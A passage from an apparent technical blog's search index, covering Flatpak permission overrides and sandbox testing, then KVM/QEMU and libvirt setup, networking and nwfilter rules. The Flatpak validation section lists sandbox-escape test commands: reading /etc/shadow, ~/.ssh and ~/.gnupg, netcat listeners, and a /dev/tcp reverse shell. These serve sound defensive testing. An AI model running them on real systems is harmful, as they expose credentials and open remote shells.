/var/lib/flatpak/app/&lt;app-name&gt;/path/to/metadata\n</code></pre>"},{"location":"blog/2024/05/07/simple-flatpak-flatpak/#the-override-command","title":"The Override Command","text":"<p>To modify the default permissions of an application, use the <code>override</code> command.</p> <p>https://docs.flatpak.org/en/latest/flatpak-command-reference.html?highlight=manaing%20portal%20permissions#flatpak-override</p> <p><code>flatpak override [OPTION...] [APP] - Override settings [for application]</code></p> <p>The <code>--[option]=VALUE</code> has tab completion for the VALUE.</p> <pre><code>flatpak override --nosocket=wayland org.gnome.gedit\n\nflatpak override --filesystem=home org.mozilla.Firefox\n\nsudo flatpak override --unshare=network org.gimp.GIMP\n</code></pre> <p>Taking the following steps should result in no network access for the application:</p> <pre><code>sudo flatpak override --unshare=network org.gimp.GIMP\n\n# overrides policy at /var/lib/flatpak/overrides/org.gimp.GIMP\n\nflatpak override --show org.gimp.GIMP\n\n# [Context]\n# shared=!network;\n\nflatpak run --command=bash org.gimp.GIMP\n\ncurl https://google.com:443\n#   curl: (7) Couldn't connect to server\n\nsudo flatpak override --reset org.gimp.GIMP\n\nflatpak override --show org.gimp.GIMP\n# this should now return an empty result\n</code></pre> <p>Next try removing access to a specific directory:</p> <p>NOTE: FILESYSTEM can be one of (This option can be used multiple times): - home - host - host-os - host-etc - xdg-desktop - xdg-documents - xdg-download - xdg-music - xdg-pictures - xdg-public-share - xdg-templates - xdg-videos - an absolute path - or a homedir-relative path like ~/dir</p> <pre><code>echo 'user:pass' &gt; ~/Music/pass.txt\n\nsudo flatpak override --nofilesystem=~/Music org.gimp.GIMP\n\nls -l ~/Music/\n\n# total 4\n# -rw-rw-r-- 1 user user 10 Apr 2 00:00 pass.txt\n\nflatpak run --command=bash org.gimp.GIMP\n\nls -l ~/Music/\n\n# total 0\n</code></pre> <p>Note that with <code>--filsystem=host</code> flatpak remounts the host's <code>/etc/*</code> folder under <code>/var/run/host/etc/*</code> within the sandbox, meaning those files are all still there, just as a read-only tmpfs.</p> <p>Another interesting exercise is when running both snap packages and flatpak apps on the same system, they don't necessarily respect all of the other's default access controls.</p> <p>For example, snaps typically cannot read other snap's directories, or any directory you may create under ~/snap (ignoring the other /snap and /tmp/snap* directories for now, though they too are read / write protected).</p> <p>We'll use an example where we need to install GIMP on a workstation, where all of the other applications are installed and managed through snapd.</p> <p>We can integrate GIMP on a system like that with this:</p> <pre><code>sudo flatpak override --nofilesystem=host org.gimp.GIMP\n\nsudo flatpak override --filesystem=~/snap/flatpakaccess/gimp:create org.gimp.GIMP\n\ncat /var/lib/flatpak/overrides/org.gimp.GIMP\n\n# [Context]\n# filesystems=!host;~/snap/flatpakaccess/gimp:create;\n\nflatpak run org.gimp.GIMP\n</code></pre> <p>This allows:</p> <ul> <li>A folder of <code>~/snap/flatpakaccess/gimp</code> to be created (if it doesn't exist) and written to.</li> <li>GIMP to save it's data to a <code>~/snap</code> directory, preventing other snaps from reading those files.</li> <li>GIMP cannot see anything outside of it's own sandboxed application directory (a tmpfs mount), and the snap directory assigned to it via the override.<ul> <li>This view of the filesystem is extremely limited, you can examine the sandbox with <code>flatpak run --command=bash org.gimp.GIMP</code></li> </ul> </li> </ul>"},{"location":"blog/2024/05/07/simple-flatpak-flatpak/#validating-permissions","title":"Validating Permissions","text":"<p>This is a quick reference of how to validate your application is adhering to the correct permissions:</p> <pre><code>flatpak run --command=bash &lt;application-name&gt;\n</code></pre> <p>You now have a shell in the context of the application's security sandbox.</p> <p>Try to access protected items or make remote connections:</p> <pre><code>sudo -l\ncat /etc/shadow\ncurl https://google.com\nnc -nvlp 8080\ncommand -v pkexec\nls -l /tmp/snap.&lt;snap-pacakge&gt;\nls -laR ~/.gnupg\nfind ~/.ssh -type f -ls\n</code></pre> <p>You'll see if you follow along in <code>wireshark</code>, <code>tcpdump</code>, <code>tshark</code> or similar, the connection is never made -- no packets will leave the host. More specifically, no packets leave the sandbox.</p> <p>Try to breakout with a simple shell:</p> <pre><code>python3 -c 'import pty; pty.spawn(\"/bin/sh\")' ; cat /etc/shadow\n</code></pre> <p>Try to create an http server (it should actually succeed here, but only exists within the sandbox and is not visible by the host):</p> <pre><code>python3 -m http.server 8080 --bind 127.0.0.1;\n# in another terminal on the host, try (this should fail):\ncurl http://127.0.0.1:8080\n# see if it's visible to the host, it should not be visible or accessible from outside of the sandbox\nnetstat -antup\n</code></pre> <p>Try another breakout</p> <pre><code># https://github.com/carlospolop/hacktricks/blob/master/linux-unix/useful-linux-commands/bypass-bash-restrictions.md\n# setup a listener outside the security sandbox on the host\nnc -nvlp 4400 -s 127.0.0.1\n# from within the sandbox try:\n(sh)0&gt;/dev/tcp/127.0.0.1/4400\n# it should fail if shared=!network is set\n# it should also fail even if you try to reach the host machine's local network address\n# if it doesn't fail, you'll get the following:\nConnection received on 127.0.0.1 40864\n# in that window, enter this to complete the breakout:\nexec &gt;&amp;0\n</code></pre> <p>Try to execute OS commands with python:</p> <pre><code>python3 -c 'import os; os.system(\"/usr/bin/whoami\")'\npython3 -c 'import os; os.system(\"/usr/bin/sudo -l\")'\npython3 -c 'import os; os.system(\"/usr/bin/nc -nvlp 4000\")'\npython3 -c 'import os; os.system(\"/usr/bin/curl http://172.20.111.1\")'\n\nsh-5.1$ python3 -c 'import os; os.system(\"(sh)0&gt;/dev/tcp/172.20.111.1:443\")'\nsh: line 1: /dev/tcp/172.20.111.1:443: No such file or directory\n</code></pre> <p>Another intersting way to view activity is in the system IO, with <code>pspy</code>:</p> <pre><code># on the host outside of the sandbox:\n# replace pspy64 with pspy32 if on x86\ncurl -sSLO 'https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64'\nsha256sum ./pspy64 | grep 'f7f14aa19295598717e4f3186a4002f94c54e28ec43994bd8de42caf79894bdb'\nchmod +x ./pspy64\n./pspy64\n</code></pre> <p>This will show you commandline information of all running processes including flatpak applications.</p> <p>Try running your flatpak app again with <code>--command=bash</code> and see what commands you can pick up with <code>pspy</code> running in another window.</p> <p>One final exercise, in looking for files that applications typically create in a <code>/tmp</code> directory, but are now being created within the container, rendered no results with <code>sudo find / -type &lt;type&gt; -name \"&lt;regex&gt;\" -ls 2&gt;/dev/null</code></p> <p>However these files can be seen from within the container when using the <code>flatpak run --command=bash org.example.app</code></p> <p>Where exactly is this location from the context of the host?</p> <p>Oddly enough, Sysmon (for Linux) can see these files being created / deleted by applications in a sandbox:</p> <pre><code>Event SYSMONEVENT_FILE_CREATE\n    RuleName: -\n    UtcTime: 2022-04-05 01:02:03.998\n    ProcessGuid: {abcd1234-1234-aabb-ccdd-0000000000}\n    ProcessId: 142327\n    Image: /newroot/app/var/lib/flatpak/app/org.example.app/x86_64/stable/abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789/files/bin/example\n    TargetFilename: /newroot/tmp/.ZLX123/file.txt\n    CreationUtcTime: 2022-04-05 01:02:03.998\n</code></pre> <p>Looking for <code>/newroot</code> online leads to this commit, closing issue #305, showing that the default mount point is <code>/tmp/newroot</code>, updated from previous paths that were used.</p> <ul> <li>https://github.com/containers/bubblewrap/commit/efc89e3b939b4bde42c10f065f6b7b02958ed50e</li> </ul> <p>The first paragraph in the usage for <code>bwrap</code> also explains this chroot-like environment is completely invisible to the normal host:</p> <ul> <li>https://github.com/containers/bubblewrap#usage</li> </ul>"},{"location":"blog/2024/12/08/simple-qemu-kvm-kernel-based-virtual-machine/","title":"KVM (Kernel-based Virtual Machine)","text":"<p>KVM is a type 1 hypervisor technology built into the Linux kernel, using components like QEMU, libvirt, and virt-manager to orchestrate virtual machines. This reference aims to cover everything you'd need to have a basic understanding of KVM and QEMU, how to use <code>virt-manager</code>, networking configuration options, and the various components such as SPICE.</p> <p>What is KVM?</p> <ul> <li><code>virt-manager</code> acts as one possible GUI / CLI frontend to managing VM's.</li> <li><code>qemu</code> is the virtualization / emulation technology that technologies like virt-manager call to run VM's.</li> <li>QEMU can be used via the CLI on its own.</li> </ul> <p>KVM relates to QEMU when you run VM's with hardware acceleration rather than pure software emulation, KVM provides the hardware translation and acceleration component. This is the difference when starting VM's with <code>kvm</code> instead of <code>qemu-system-x86_64</code>.</p> <p><code>kvm</code> is the equivalent of running <code>qemu-system-x86_64 -machine accel=kvm:tcg</code> (see <code>man kvm</code>).</p> <p><code>libvirt</code> is an API, daemon, and management tool that ties all of the components you want to use together, and is used by KVM, Xen, VMware ESXi, and QEMU when performing virtualization tasks.</p>"},{"location":"blog/2024/12/08/simple-qemu-kvm-kernel-based-virtual-machine/#virt-manager","title":"Virt-Manager","text":"<p>Virt-Manager is a GUI application. Think of Virt-Manager as an equivlent to Hyper-V, VMware Workstation, or VirtualBox.</p> <ul> <li>https://virt-manager.org/</li> <li>https://github.com/virt-manager/virt-manager</li> </ul>"},{"location":"blog/2024/12/08/simple-qemu-kvm-kernel-based-virtual-machine/#install","title":"Install","text":"<p>Install the utilties and add your user(s) you want to access the VM's to the libvirtd group.</p> <pre><code>sudo apt install -y virt-manager\nsudo usermod -aG libvirtd $USER\n</code></pre>"},{"location":"blog/2024/12/08/simple-qemu-kvm-kernel-based-virtual-machine/#paths","title":"Paths","text":"Path Description <code>/etc/libvirt/qemu</code> VM XML configs <code>/var/lib/libvirt/images</code> VM disks <code>/var/lib/libvirt/qemu/nvram</code> EFI Vars <code>/var/lib/libvirt/qemu/snapshot/&lt;vm-name&gt;/&lt;snapshot-name&gt;.xml</code> Snapshot XML configs <code>/etc/libvirt/qemu/networks/</code> Network configurations <code>/etc/libvirt/nwfilter/</code> Network filtering configurations"},{"location":"blog/2024/12/08/simple-qemu-kvm-kernel-based-virtual-machine/#permissions","title":"Permissions","text":"<p>On Ubuntu 22.04 and higher, these are the default path permissions. Essentially <code>/var/lib/libvirt</code> itself and everything below should owned by <code>root:root</code> except for <code>/var/lib/libvirt/qemu</code> which is owned by <code>libvirt-qemu:kvm</code>.</p> <pre><code>drwxr-xr-x  2 root         root 4096 Mar 13  2025 .\ndrwxr-xr-x  2 root         root 4096 Sep 10  2025 ..\ndrwxr-x---  2 root         root 4096 Jul  5  2025 boot\ndrwxr-xr-x  2 root         root 4096 Mar 13  2025 dnsmasq\ndrwxr-x---  2 root         root 4096 Mar 13  2025 images\ndrwxr-x---  2 libvirt-qemu kvm  4096 Mar 13  2025 qemu\ndrwx------  2 root         root 4096 Jul  5  2025 sanlock\ndrwxr-x---  2 root         root 4096 Mar 11  2025 swtpm\n</code></pre> <p>This is important to know if you want to store virtual machines in non-default paths.</p>"},{"location":"blog/2024/12/08/simple-qemu-kvm-kernel-based-virtual-machine/#commands","title":"Commands","text":"<p><code>virsh</code> allows you to automate and control virtual machine behavior from the CLI.</p> Command Description <code>virsh list --all</code> List all VMs <code>virsh [start|stop|shutdown|reset] &lt;vm-name&gt;</code> Control VM state"},{"location":"blog/2024/12/08/simple-qemu-kvm-kernel-based-virtual-machine/#snapshot-commands","title":"Snapshot Commands","text":"<p>Snapshot Requirements</p> <p>VMs must have a disk image associated with them to take and modify snapshots.*</p> Command Description <code>virsh snapshot-list &lt;vm-name&gt;</code> List all snapshots of <code>&lt;vm-name&gt;</code> <code>virsh snapshot-create-as &lt;vm-name&gt; &lt;snapshot-name&gt; --description \"&lt;description&gt;\"</code> Take a snapshot <code>virsh snapshot-revert &lt;vm-name&gt; &lt;snapshot-name&gt;</code> Revert to <code>&lt;snapshot-name&gt;</code> <code>virsh snapshot-delete &lt;vm-name&gt; &lt;snapshot-name&gt;</code> Delete a snapshot"},{"location":"blog/2024/12/08/simple-qemu-kvm-kernel-based-virtual-machine/#networking-commands","title":"Networking Commands","text":"Command Description <code>virsh net-list --all</code> List all available <code>&lt;network-name&gt;</code>s <code>virsh net-dhcp-leases &lt;network-name&gt;</code> List all current DHCP leases on <code>&lt;network-name&gt;</code> if it's managed via virt-manager / dnsmasq <code>virsh domiflist &lt;vm-name&gt;</code> List all network interfaces attached to <code>&lt;vm-name&gt;</code> <code>virsh domifaddr &lt;vm-name&gt; [--source agent|arp|lease]</code> Get IP information from <code>&lt;vm-name&gt;</code>, optionally using one of three methods <code>virsh net-dumpxml &lt;network&gt;</code> Output the virtual network information as an XML dump to stdout. <code>virsh net-create &lt;network&gt; [--validate]</code> Create a transient (temporary) virtual network from an XML file and instantiate (start) the network. <code>virsh net-define &lt;network&gt; [--validate]</code> Define an inactive persistent virtual network or modify an existing persistent one from the XML file. <code>virsh net-undefine &lt;network&gt;</code> Undefine the configuration for a persistent network. If the network is active, make it transient. <code>virsh net-edit &lt;network&gt;</code> Edit the XML configuration file for a network. <code>virsh net-list [--all]</code> Returns the list of active networks. <code>virsh net-start &lt;network&gt;</code> Start a (previously defined) inactive network. <code>virsh net-destroy &lt;network&gt;</code> Destroy (stop) a given transient or persistent virtual network specified by its name or UUID. This takes effect immediately. <code>virsh nwfilter-define &lt;filter&gt; [--validate]</code> Define or update a network filter from an XML file <code>virsh nwfilter-undefine &lt;filter&gt;</code> Undefine a network filter <code>virsh nwfilter-dumpxml &lt;filter&gt;</code> Network filter information in XML <code>virsh nwfilter-list</code> List network filters <code>virsh nwfilter-edit &lt;filter&gt;</code> Edit XML configuration for a network filter"},{"location":"blog/2024/12/08/simple-qemu-kvm-kernel-based-virtual-machine/#networking","title":"Networking","text":"<p>Tailscale and Exit Nodes</p> <p>If you use tailscale and force all traffic out of an exit node, this may break routing on your libvirtd instance. Simply unset the exit node to verify this.</p> <pre><code>sudo tailscale set --exit-node=''\n</code></pre> <p>libvirtd VM's appear under <code>ip a</code> as <code>vnetX</code>, which you can observe under <code>kern.log</code> when a VM comes online.</p>"},{"location":"blog/2024/12/08/simple-qemu-kvm-kernel-based-virtual-machine/#internal-networking","title":"Internal Networking","text":"<p>These can be created under Edit &gt; Connection Details &gt; Virtual Networks</p> <p>pfSense with Virtual Networks</p> <p>The examples below are for a pfSense router VM to have it's own internal LAN and OPT interfaces that are purely virutal, and cannot be seen by or talk to the host's networking interfaces.</p> <ul> <li>Choose \"Add\"</li> <li>Name: <code>pfsense_lan</code> (<code>pfsense_opt1</code>, <code>pfsense_opt2</code>...)</li> <li>Mode: Isolated</li> <li>Enable IPv4<ul> <li>Disable DHCP</li> <li>Delete all the other IPv4 information (this can be provisioned by pfSense)</li> <li>DNS can be \"Custom: <code>&lt;blank&gt;</code>\"</li> </ul> </li> <li>IPv6 must remain disabled for now, it requires a hard-coded address</li> <li>Once created you should see \"Autostart On Boot\" checked as well</li> </ul> <p>Ultimately your pfSense VM is routing via NAT through the <code>default</code> virt-manager network, and has its own, virtual (isolated) pfsense_lan, pfsense_opt1, and pfsense_opt2, etc. addresses available to it. To connect a VM to pfSense, attach it to any of the virtual (isolated) network interfaces.</p>"},{"location":"blog/2024/12/08/simple-qemu-kvm-kernel-based-virtual-machine/#troubleshooting","title":"Troubleshooting","text":"<p>This example deletes the generated xml config under <code>/etc/libvirt/qemu</code>, and uses the built in template from <code>/usr/share/libvirt</code> to reprovision a totally new default NAT network.</p> <p>Once you've powered down or paused all VMs, quit <code>virt-manager</code> and its system tray icon. The entire bash block below is safe to copy and paste.</p> <pre><code>sudo systemctl restart libvirtd\nsudo virsh net-list --all\nsudo virsh net-undefine default\nsudo virsh net-destroy default\nsudo rm -f /etc/libvirt/qemu/networks/default.xml\nsudo virsh net-define /usr/share/libvirt/networks/default.xml\nsudo virsh net-start default\nsudo virsh net-autostart default\nsudo virsh net-list --all\nsystemctl status libvirtd\n</code></pre>"},{"location":"blog/2024/12/08/simple-qemu-kvm-kernel-based-virtual-machine/#filtering-network-traffic","title":"Filtering Network Traffic","text":"<p>nwfilter vs Host Firewall</p> <p>Instead of using a host utility like <code>iptables</code> or <code>ufw</code> to manage virtual machine network filtering, it's better to use libvirt's built-in <code>nwfilter</code> directly to ensure rules are being applied to machines correctly. This is most useful when VM's are either bridged, or NAT'd without a router / firewall in front of them.</p> <ul> <li>libvirt.org/firewall</li> <li>libvirt.org/formatnwfilter</li> <li><code>nwfilter</code> CLI</li> <li>RedHat: Apply Network Filtering</li> </ul> <p>There are a number of pre-built example rules. According to the documentation:</p> <p>They are all stored in <code>/etc/libvirt/nwfilter</code>, but don't edit the files there directly. Use <code>virsh nwfilter-define</code> to update them. This ensures the guests have their iptables/ebtables rules recreated.</p> <p>To apply nwfilter rules, we need to:</p> <ul> <li>Create the XML file, defaults are under <code>/etc/libvirt/nwfilter/&lt;rule-name&gt;.xml</code></li> <li>Define the new file as a rule with <code>virsh nwfilter-define</code></li> <li>Add a <code>&lt;filterref/&gt;</code> reference to this rule in a VM's network configuration XML</li> <li>Verify the rules are working</li> </ul>"},{"location":"blog/2024/12/08/simple-qemu-kvm-kernel-based-virtual-machine/#example-block-tailnet-access","title":"Example: Block Tailnet Access","text":"<p>This is useful if for example your host has access to Tailnet resources that an untrusted guest VM should not be able to reach.</p> <p>Create a custom rule by referencing the custom rule examples. We can build one that uses the existing <code>clean-traffic</code> filter as a base reference, and adds a \"drop\" rule to all outbound traffic destined for <code>100.64.0.0/10</code> to prevent VM's from accessing Tailnet endpoints they shouldn't be able to see.</p> <pre><code>sudo nano /etc/libvirt/nwfilter/no-tailnet-traffic.xml\n</code></pre> <p>Generate a UUID</p> <p>In Linux you can create a UUID using a proc path. Credit to rpinz for this:</p> <pre><code>cat /proc/sys/kernel/random/uuid\ndc48344d-99fa-42c2-8db8-4eeaea0116f6\n</code></pre> <p>The priority values are left as the defaults described in the documentation.</p> <pre><code>&lt;filter name='no-tailnet-traffic' chain='ipv4' priority='-700'&gt;\n  &lt;uuid&gt;dc48344d-99fa-42c2-8db8-4eeaea0116f6&lt;/uuid&gt;\n  &lt;!-- Reference the clean traffic filter to prevent\n       MAC, IP and ARP spoofing. By not providing\n       and IP address parameter, libvirt will detect the\n       IP address the VM is using.\n\n       https://libvirt.org/formatnwfilter.html#writing-your-own-filters\n  --&gt;\n  &lt;filterref filter='clean-traffic'/&gt;\n\n  &lt;!-- Drop all outbound traffic to the CGNAT ranges, or\n       100.64.0.0/10, which is also used in Tailnets.\n       This prevents VM's from talking to endpoints that\n       hosts can reach over Tailnets.\n\n       By referencing the clean-traffic filter above, the\n       rule is dynamically obtaining each VM's $IP address\n       when this filter applies. That's why a srcipaddr and\n       srcipmask aren't used here.\n\n       Since CGNAT ranges are exclusively IPv4, this only\n       applies to the &lt;ip/&gt; protocol in libvirt's nwfilter.\n\n       https://libvirt.org/formatnwfilter.html#reserved-variables\n  --&gt;\n  &lt;rule action='drop' direction='out' priority='500'&gt;\n    &lt;ip dstipaddr='100.64.0.0' dstipmask='255.192.0.0'/&gt;\n  &lt;/rule&gt;\n&lt;/filter&gt;\n</code></pre> <p>Nested Filter References</p> <p>As you can probably tell from the example, you can build rules by referencing other rules, that reference other rules, and so on.</p> <p>Save it, then define it as a new <code>nwfilter</code> rule. <code>--validate</code> ensures there are no syntax issues.</p> <pre><code>sudo virsh nwfilter-define /etc/libvirt/nwfilter/no-tailnet-traffic.xml --validate\n</code></pre> <p>Add the following into the <code>&lt;interface/&gt;</code> block within a guest VM's NIC XML data.</p> <pre><code>  &lt;filterref filter='no-tailnet-traffic'/&gt;\n</code></pre> <p>Reboot the VM if necessary and verify that the rules are working.</p> <p>Adding Filters to Networks</p> <p>Initially adding a <code>&lt;filterref/&gt;</code> block to a network such as the <code>default</code> network was tried. It appears these rules must be applied per-machine. Until a way is found to apply this globally per-network, assume this is true.</p>"},{"location":"blog/2024/12/08/simple-qemu-kvm-kernel-based-virtual-machine/#spice","title":"SPICE","text":"<p>Some machines will install the <code>spice-vdagent</code> by default, however others (Kali) may require you install it after you install the guest.</p> <pre><code>sudo apt update; sudo apt install -y spice-vdagent\n</code></pre> <p>Sometimes the SPICE connection will go completely blank after some time. This could either be from Power Saver settings on the guest, or an issue with the SPICE agent / server.</p> <p>Blank or frozen SPICE connection on guest sleep</p> <p>You should configure QEMU guests to never fall asleep or go blank if this is happening frequently. Alternatively pause the guest when it's not in use.</p> <p>Blank or frozen SPICE connection on host wake</p> <p>Simply leave QEMU VM's running when putting the host to sleep. They'll continue to be running and operating as normal when the host wakes again.</p> <p>Restart the SPICE server on the host for that VM:</p> <pre><code># TO DO\n</code></pre>"},{"location":"blog/2024/12/08/simple-qemu-kvm-kernel-based-virtual-machine/#clipboard","title":"Clipboard","text":"<p>If you're concerned about guests being able to steal the clipboard data from your host during use, you can temporarily pause the guest while you copy / paste credentials from your clipboard. Once a guest is paused it will no longer have access to the clipboard contents.</p> <p>You can also of course just close the SPICE window and reopen it later.</p>"},{"location":"blog/2024/12/08/simple-qemu-kvm-kernel-based-virtual-machine/#windows-guests","title":"Windows Guests","text":"<p>Windows does not come with the drivers for libvirt or the spice-agent process installed. This means guest enhancements don't work out of the box.</p> <ul> <li>SPICE Guest Tools (Windows, Latest)</li> <li>SPICE User Manual (See \"Windows guest\" section)</li> <li>chef/bento KVM/QEMU Support for Windows Templates</li> </ul> <p>If you follow the links through the Fedora project, eventually it points from here to here. Basically, without a RedHat machine + subscription, you won't have access to signed drivers for Windows to load without allowing test drivers to load (not ideal if this VM will be battle-tested or exposed to threats).</p> <p>Windows GUI Alternatives</p> <p>Given the requirement for the unsigned drivers to leverage the SPICE connection, there are a few clever alternatives:</p> <ul> <li>The new Windows App may offer some interesting solutions for networked or cloud machines on your Microsoft account</li> <li>You could use remmina to RDP into the Windows guest (remmina can be installed as a snap or flatpak for security sandboxing the client)</li> <li>You could SSH into Windows</li> <li>In virtual networks where you'd need a jump host to connect from your host to the guest, you could RDP from a neighboring Linux guest in that subnet</li> </ul>"},{"location":"blog/2024/12/08/simple-qemu-kvm-kernel-based-virtual-machine/#rdp-remmina","title":"RDP + Remmina","text":"<p>Enable RDP on the Windows Guest.</p> <ul> <li>Settings &gt; System &gt; Remote Desktop &gt; Enabled Remote Desktop: \"On\"</li> </ul> <p>Install Remmina on your host:</p> <pre><code>sudo snap install remmina\n</code></pre> <ul> <li>Configure user, password, and server IP</li> <li>Set resolution to \"Use initial window size\" and after connecting for the first time, resize the window as needed, then reconnect once more</li> <li>Advanced &gt; Quality &gt; Set to \"Best\" (great for local VM's)</li> <li>Optionally disable Clipboard synchronization if you don't want the remote machine to \"see\" your clipboard</li> </ul>"},{"location":"blog/2024/12/08/simple-qemu-kvm-kernel-based-virtual-machine/#openssh-server","title":"OpenSSH-Server","text":"<p>An alternative solution is installing OpenSSH-Server on Windows.</p> <p>winget with the program</p> <p>If installing winget on an evaluation copy of Windows Server, you will need to download the msixbundle file and license xml file from GitHub's release page. Otherwise you'll get a license error.</p> <p>See winget-cli issue #700.</p> <pre><code># Download the msixbundle and xml license file from the latest releases.\n# https://github.com/microsoft/winget-cli/releases\n# Use Add-AppxProvisionedPackage to use the -LicensePath argument.\nAdd-AppxProvisionedPackage -Online -PackagePath .\\Microsoft.DesktopAppInstaller_*.msixbundle -LicensePath .\\*_License1.xml -Verbose\n</code></pre> <p>Install the latest PowerShell + OpenSSH Server, optionally Windows Terminal</p> <pre><code>winget install --id Microsoft.PowerShell -e --source winget\nwinget install --id Microsoft.OpenSSH.Beta -e --source winget\nwinget install --id Microsoft.WindowsTerminal -e\n</code></pre> <p>Allow SSH through the firewall.</p> <pre><code>New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 &gt; $null\n</code></pre>"},{"location":"blog/2024/12/08/simple-qemu-kvm-kernel-based-virtual-machine/#qemu","title":"QEMU","text":"<p>QEMU is what virt-manager uses under the hood to run Virtal Machines, however you can use QEMU entirely on its own.</p> <ul> <li>QEMU Introduction and Essential Commands</li> <li>superuser: Forwarding Ports to QEMU Guest</li> </ul>"},{"location":"blog/2024/12/08/simple-qemu-kvm-kernel-based-virtual-machine/#install_1","title":"Install","text":"<p>To install QEMU on Debian-based systems:</p> <pre><code>my_arch=$(uname -m | cut -d '_' -f 1)\nsudo apt install -y qemu-system-\"$my_arch\"\n</code></pre> <p>Windows and macOS Support</p> <p>See the documentation for Windows and macOS instructions.</p>"},{"location":"blog/2024/12/08/simple-qemu-kvm-kernel-based-virtual-machine/#usage","title":"Usage","text":"<p>There may be reasons why you want to create and launch a VM entirely via the CLI interface with KVM / QEMU.</p> <p>Use these steps to do so.</p> <p>Credit &amp; Thanks</p> <p>Much of this section was learned from the steps under Ubuntu: Autoinstall Quick Start. This guide expands upon those, to get more options working like EFI boot and SecureBoot.</p> <p>Create a virtual disk.</p> <pre><code>truncate -s 10G ubuntu.img\n</code></pre> <p>First launch, walk through the installer (minimal, BIOS):</p> <pre><code>kvm -no-reboot -m 2048 \\\n    -drive file=ubuntu.img,format=raw,cache=none,if=virtio \\\n    -cdrom ~/path/to/ubuntu-&lt;version-number&gt;-live-server-amd64.iso\n</code></pre> <p>Second launch, start the installed machine.</p> <pre><code>kvm -no-reboot -m 2048 \\\n    -drive file=ubuntu.img,format=raw,cache=none,if=virtio\n</code></pre> <p>Alternatively if you want to launch an ISO using EFI boot:</p> <pre><code># Copy an EFI vars template file to write to\ncp /usr/share/OVMF/OVMF_VARS_4M.fd .\n\n# Boot the machine pointing to the EFI ROM and your writable vars file\nkvm -no-reboot -m 4096 -smp 4 \\\n    -cpu host \\\n    -machine q35,smm=on,accel=kvm:hvf:whpx:tcg \\\n    -global driver=cfi.pflash01,property=secure,value=on \\\n    -device virtio-net-pci,netdev=net0 \\\n    -netdev user,id=net0,hostfwd=tcp::2222-:22 \\\n    -object rng-random,filename=/dev/urandom,id=rng0 \\\n    -drive file=ubuntu.img,format=raw,cache=none,if=virtio \\\n    -cdrom ~/path/to/ubuntu-&lt;version-number&gt;-live-server-amd64.iso \\\n    -drive if=pflash,format=raw,readonly=on,file=/usr/share/OVMF/OVMF_CODE_4M.secboot.fd \\\n    -drive if=pflash,format=raw,file=efivars.fd\n</code></pre>"},{"location":"blog/2024/12/08/simple-qemu-kvm-kernel-based-virtual-machine/#blank-gui-boot","title":"Blank GUI (Boot)","text":"<p>This was discovered while building Ubuntu desktop images with packer. On boot of a working disk image, sometimes you will just see a blank screen. Try hitting <code>Esc</code> a few times to cycle between the CLI view and the GUI view in the QEMU or virt-manager GUI window. This may reveal that the system is actually booting and functional, just waiting for you to login.</p>"},{"location":"blog/2024/12/08/simple-qemu-kvm-kernel-based-virtual-machine/#blank-or-frozen-gui-vm-lockup","title":"Blank or Frozen GUI (VM Lockup)","text":"<p>This was noticed when running Ubuntu 24.04 with Wayland, on both the guest and host. The lockup can require a full power cycle of the host, or just be temporary.</p> <p>The fix in that specific case was to update the host's graphics driver packages; specifically, to the new open-kernel drivers for Nvidia. In most cases this is a good set of steps to take before troubleshooting further: update all host packages, the firmware, and GPU drivers.</p> <p>During the initial search on this issue, Gemini and GPT o4-mini both started pointing to the <code>vgamem</code> value of the QXL video driver.</p> <ul> <li>ovirt.org: QXL and Video RAM</li> <li>libvirt.org: Video Devices</li> <li>launchpad.net: Frequent 15-sec guest freeze with Ubuntu 22.04 host and guest</li> </ul> <p>It's suggested that setting <code>vgamem=\"65536\"</code>, or at least a higher value, in the XML config of the QXL video device in virt-manager provides enough video-ram to prevent this type of freeze.</p>"},{"location":"blog/2024/12/08/simple-qemu-kvm-kernel-based-virtual-machine/#networking_1","title":"Networking","text":"<p>You can choose between numerous networking interface devices. List all available to you with the following. Note that some OS's are only compatible with certain devices.</p> <p>Generally, <code>e1000</code> seems to work across any guest, while <code>virtio-net-pci</code> is the most performant, but may only work on unix-like guests.</p> <pre><code>qemu-system-x86_64 -nic model=help\nSupported NIC models:\ne1000\ne1000-82544gc\ne1000-82545em\ne1000e\ni82550\ni82551\ni82557a\ni82557b\ni82557c\ni82558a\ni82558b\ni82559a\ni82559b\ni82559c\ni82559er\ni82562\ni82801\nne2k_pci\npcnet\npvrdma\nrtl8139\ntulip\nvirtio-net-pci\nvirtio-net-pci-non-transitional\nvirtio-net-pci-transitional\nvmxnet3\n</code></pre>"},{"location":"blog/2024/12/08/simple-qemu-kvm-kernel-based-virtual-machine/#secureboot-and-qemu","title":"SecureBoot and QEMU","text":"<p>Required Settings</p> <p>You'll need to specify the same settings you'd use in virt-manager to configure a VM for SecureBoot.</p> <ul> <li>superuser/qemu-kvm-uefi-secure-boot-doesnt-work</li> <li>debian.org/SecureBoot/VirtualMachine</li> </ul> <p>Practically what you need are 3 items:</p> <ul> <li>The Q35 chipset</li> <li>The EFI firmware ROM (read-only)</li> <li>The EFI variables (writable)</li> </ul> <p>The EFI variables file can be copied to a place for use with that VM from <code>/usr/share/OVMF/OVMF_VARS_*</code>.</p> <p>Which of those files you need depends on which EFI ROM you used to provision the VM.</p> <ul> <li><code>-machine q35,smm=on</code> handles the chipset, and supports SecureBoot</li> <li><code>accel=kvm:hvf:whpx:tcg</code> tells QEMU what accelerator to use in that order, depending on what's available</li> <li><code>-drive if=pflash,format=raw,readonly=on,file=/usr/share/OVMF/OVMF_CODE_4M.secboot.fd</code> points to the EFI ROM</li> <li><code>-drive if=pflash,format=raw,file=efivars.fd</code> points to a local, writable, copy of the EFI variables.</li> </ul> <pre><code>cd /path/to/ubuntu-2204.qcow2 &amp;&amp; \\\nkvm -no-reboot -m 4096 -smp 4 \\\n    -cpu host \\\n    -machine q35,smm=on,accel=kvm:hvf:whpx:tcg \\\n    -global driver=cfi.pflash01,property=secure,value=on \\\n    -device virtio-net-pci,netdev=net0 \\\n    -netdev user,id=net0,hostfwd=tcp::2222-:22 \\\n    -object rng-random,filename=/dev/urandom,id=rng0 \\\n    -drive file=ubuntu-2204.qcow2,format=qcow2,if=virtio \\\n    -drive if=pflash,format=raw,readonly=on,file=/usr/share/OVMF/OVMF_CODE_4M.secboot.fd \\\n    -drive if=pflash,format=raw,file=efivars.fd \\\n    -vga virtio \\\n    -display 